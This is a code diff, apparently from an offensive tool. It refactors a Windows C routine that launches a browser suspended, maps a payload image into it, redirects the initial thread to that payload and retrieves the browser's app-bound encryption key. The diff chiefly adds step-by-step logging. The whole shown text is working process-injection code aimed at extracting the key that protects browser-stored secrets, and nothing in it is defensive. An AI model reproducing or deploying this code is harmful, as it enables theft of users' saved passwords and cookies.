@@ -2,61 +2,72 @@
 
 /*** method: Hijack (suspended browser initial thread redirected to our payload) ***/
 
+_Success_(return != FALSE)
 BOOL
 AbeGetKeyHijack(
     _In_ const NET_BROWSER_INFO* Browser,
-    _In_ ULONG BrowserIndex,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
 {
     PVOID Self = (PVOID)&__ImageBase;
-    STARTUPINFOW Si;
     PROCESS_INFORMATION Pi;
     CONTEXT Ctx = { 0 };
     PVOID Mapped = NULL;
     LONG Code = (LONG)E_FAIL;
+    NTSTATUS Status;
+    W32ERROR Error;
+    ULONGLONG Step;
+    BOOL Ok;
 
-    if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;
-
-    RtlZeroMemory(&Si, sizeof(Si));
-    RtlZeroMemory(&Pi, sizeof(Pi));
-    Si.cb = sizeof(Si);
-    if (!CreateProcessInternalW(NULL,
-                                Browser->ExePath,
-                                NULL,
-                                NULL,
-                                NULL,
-                                FALSE,
-                                CREATE_SUSPENDED,
-                                NULL,
-                                NULL,
-                                &Si,
-                                &Pi,
-                                NULL))
+    Step = AbeStepStart();
+    Ok = AbePrepareRequest(Browser);
+    AbeLogStepBool(L"Hijack", L"prepare request", Ok, Step);
+    if (!Ok)
     {
-        AbeLog(L"Hijack: failed to create browser process, gle=%lu\r\n", Err_GetLastError());
+        return FALSE;
+    }
+    Step = AbeStepStart();
+    Ok = AbeCreateBrowserProcess(Browser->ExePath, CREATE_SUSPENDED, &Pi);
+    Error = Ok ? ERROR_SUCCESS : Err_GetLastError();
+    AbeLogStepWin32(L"Hijack", L"create suspended browser", Error, Step);
+    if (!Ok)
+    {
         return FALSE;
     }
 
-    if (AbeMapSelf(Pi.hProcess, &Mapped))
+    Step = AbeStepStart();
+    Status = AbeMapSelf(Pi.hProcess, &Mapped);
+    AbeLogStepNt(L"Hijack", L"map payload image", Status, Step);
+    if (NT_SUCCESS(Status))
     {
         Ctx.ContextFlags = CONTEXT_CONTROL;
-        if (NT_SUCCESS(NtGetContextThread(Pi.hThread, &Ctx)))
+        Step = AbeStepStart();
+        Status = NtGetContextThread(Pi.hThread, &Ctx);
+        AbeLogStepNt(L"Hijack", L"get initial thread context", Status, Step);
+        if (NT_SUCCESS(Status))
         {
             Ctx.CONTEXT_PC = (ULONG_PTR)((PBYTE)Mapped +
                                          ((ULONG_PTR)AbeHijackEntry - (ULONG_PTR)Self));
-            if (NT_SUCCESS(NtSetContextThread(Pi.hThread, &Ctx)))
+            Step = AbeStepStart();
+            Status = NtSetContextThread(Pi.hThread, &Ctx);
+            AbeLogStepNt(L"Hijack", L"set payload entry", Status, Step);
+            if (NT_SUCCESS(Status))
             {
-                NtResumeThread(Pi.hThread, NULL);
-                Code = AbeWaitRemoteResult(Pi.hProcess, Pi.hProcess, Mapped, Self, Key);
+                Step = AbeStepStart();
+                Status = NtResumeThread(Pi.hThread, NULL);
+                AbeLogStepNt(L"Hijack", L"resume browser thread", Status, Step);
+                if (NT_SUCCESS(Status))
+                {
+                    Step = AbeStepStart();
+                    Code = AbeWaitRemoteResult(Pi.hProcess, Pi.hProcess, Mapped, Self, Key);
+                    AbeLogStepHr(L"Hijack", L"wait payload result", (HRESULT)Code, Step);
+                }
             }
         }
     }
-    if (Code != 0)
-    {
-        AbeLog(L"Hijack: payload failed, hr=0x%08lX\r\n", (unsigned long)Code);
-    }
 
-    NtTerminateProcess(Pi.hProcess, 0);
+    Step = AbeStepStart();
+    Status = NtTerminateProcess(Pi.hProcess, 0);
+    AbeLogStepNt(L"Hijack", L"terminate browser", Status, Step);
     NtWaitForSingleObject(Pi.hProcess, FALSE, NULL);
     NtClose(Pi.hThread);
     NtClose(Pi.hProcess);
